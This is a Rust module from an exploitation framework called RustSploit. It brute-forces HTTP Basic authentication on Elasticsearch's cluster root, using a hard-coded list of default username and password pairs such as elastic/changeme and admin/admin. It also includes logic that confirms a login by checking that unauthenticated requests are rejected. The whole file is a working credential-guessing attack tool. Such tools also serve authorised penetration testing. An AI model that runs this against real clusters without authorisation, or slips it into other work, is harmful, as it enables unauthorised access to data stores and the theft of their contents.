//! Elasticsearch credential brute-force via HTTP Basic on the cluster root.

use anyhow::{Context, Result};
use crate::module::{ModuleCtx, ModuleOutcome};
use std::time::Duration;

use crate::module_info::{ModuleInfo, ModuleRank};
use crate::utils::creds_helper::{self, CredsRun};
use crate::utils::LoginResult;

const DEFAULT_PORT: u16 = 9200;

const DEFAULTS: &[(&str, &str)] = &[
    ("elastic", "changeme"),
    ("elastic", "elastic"),
    ("elastic", "password"),
    ("kibana", "kibana"),
    ("admin", "admin"),
    ("admin", "password"),
];

pub fn info() -> ModuleInfo {
    ModuleInfo {
        name: "Elasticsearch Bruteforce".to_string(),
        description:
            "Tests Elasticsearch HTTP Basic auth on the cluster root endpoint. \
             Single-target — scheduler does fan-out."
                .to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: ModuleRank::Normal,
        default_port: Some(9200),
    }
}

pub async fn run(ctx: &ModuleCtx) -> Result<ModuleOutcome> {
    let target = ctx.target.as_single().context("elasticsearch_bruteforce requires a single-host target")?;
    creds_helper::run(
        target,
        CredsRun {
            service_name: "elasticsearch",
            default_port: DEFAULT_PORT,
            source_module: "creds/generic/elasticsearch_bruteforce",
            defaults: DEFAULTS,
            password_only: false,
        },
        |host, port, user, pass, timeout| async move { probe(&host, port, &user, &pass, timeout).await },
    )
    .await
}

async fn probe(host: &str, port: u16, user: &str, pass: &str, timeout: Duration) -> LoginResult {
    let client = match crate::utils::build_http_client(timeout) {
        Ok(c) => c,
        Err(e) => {
            return LoginResult::Error {
                message: format!("http client: {e}"),
                retryable: false,
            }
        }
    };
    let url = format!("http://{}:{}/", host, port);
    let resp = client
        .get(&url)
        .basic_auth(user, Some(pass))
        .send()
        .await;
    let status = match resp {
        Ok(r) => r.status().as_u16(),
        Err(e) => {
            return LoginResult::Error {
                message: format!("get: {e}"),
                retryable: e.is_timeout() || e.is_connect(),
            }
        }
    };
    match status {
        200 => {
            // An Elasticsearch node with security DISABLED returns 200 to every
            // request and ignores the credentials, so a credentialed 200 alone is
            // not proof — without this guard every password is a false positive on
            // an open node. Confirm an UNauthenticated GET is rejected (401) first.
            match client.get(&url).send().await {
                Ok(r) if r.status().as_u16() == 401 => LoginResult::Success,
                Ok(r) => {
                    tracing::debug!(
                        "elasticsearch {host}:{port}: unauthenticated GET returned {} — node not secured, not a credential",
                        r.status()
                    );
                    LoginResult::AuthFailed
                }
                Err(e) => LoginResult::Error {
                    message: format!("baseline get: {e}"),
                    retryable: e.is_timeout() || e.is_connect(),
                },
            }
        }
        401 | 403 => LoginResult::AuthFailed,
        429 | 500..=599 => LoginResult::Error {
            message: format!("transient status {status}"),
            retryable: true,
        },
        other => LoginResult::Error {
            message: format!("unexpected status {other}"),
            retryable: false,
        },
    }
}

crate::register_native_module!(crate::module::Category::Creds, "generic/elasticsearch_bruteforce", native);
